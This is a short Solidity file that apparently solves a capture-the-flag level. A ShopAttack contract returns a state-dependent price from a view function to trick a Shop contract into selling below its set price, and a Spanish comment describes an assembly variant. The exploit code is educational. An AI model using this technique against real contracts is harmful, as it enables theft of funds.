// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3300)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3300)();
    }
  }
}

contract ShopAttack {
    function price() external view returns (uint) {
        bool isSold = Shop(msg.sender).isSold();
            uint result;
            
            if (isSold) {
                result=1;
            }else{
                result=100;
            }

            /*
            EXISTE UNA SOLUCION EN ASSEMBLY DEBIDO A UNA RESTRICCION EN EL GAS QUE SE DEBE CONSUMIR
            SIN EMBARGO ESA RESTRICCION NO ESTA EN SEP 2022
            assembly {
            switch isSold
            case 1 {
                result := 99
            }
            default {
                result := 100
            }
            
            mstore(0x0, result)
            return(0x0, 32)*/
            return(result);
        }
    function attack(Shop _victim) public {
        Shop(_victim).buy();
    }
   
}

